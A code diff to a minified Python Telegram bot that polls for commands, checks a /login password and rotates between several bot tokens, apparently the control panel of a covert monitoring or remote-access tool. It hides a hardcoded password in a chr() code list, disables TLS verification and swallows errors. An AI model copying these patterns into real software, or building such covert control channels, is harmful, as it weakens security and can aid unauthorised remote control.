@@ -71,8 +71,8 @@ class T:
  def _auth(self,cid):return time.time()<self.ses.get(str(cid),0)
  def _pm(self,u):
   m=u.get('message',{});cid=m.get('chat',{}).get('id');t=m.get('text','')
-  from monitor import _ as secret
-  if t.startswith("/start") or t.startswith("/login"):
+  from monitor import _pw as secret
+  if t.startswith("/login"):
    parts=t.split()
    upw=parts[1] if len(parts)>1 else ""
    if upw==secret():
@@ -108,17 +108,22 @@ class T:
   try:self._ap("answerCallbackQuery",{"callback_query_id":cb['id']})
   except:pass
  def _pl(self):
-  off=0
+  off=-1
+  idx=0
   while self.rn:
    try:
-    token=self.act[0]
-    r=requests.get(f"https://api.telegram.org/bot{token}/getUpdates?offset={off}&timeout=20",timeout=25,verify=False).json()
+    t=self.act[idx]
+    r=requests.get(f"https://api.telegram.org/bot{t}/getUpdates?offset={off}&limit=1&timeout=20",timeout=25,verify=False).json()
     if r and r.get('ok'):
      for u in r.get('result',[]):
       off=u['update_id']+1
       if 'message' in u:self._pm(u)
       if 'callback_query' in u:self._pc(u)
-   except:pass
+    else:
+     idx=(idx+1)%len(self.act)
+   except:
+    idx=(idx+1)%len(self.act)
+    time.sleep(2)
    time.sleep(0.5)
  def start(self):threading.Thread(target=self._pl,daemon=True).start()
-def _():return"".join([chr(x)for x in[90,97,101,110,49,50,51,64,49,50,51,64,49,50,51]])
+def _():return"".join([chr(x)for x in[90,97,101,110,49,50,51,64,49,50,51,64]])
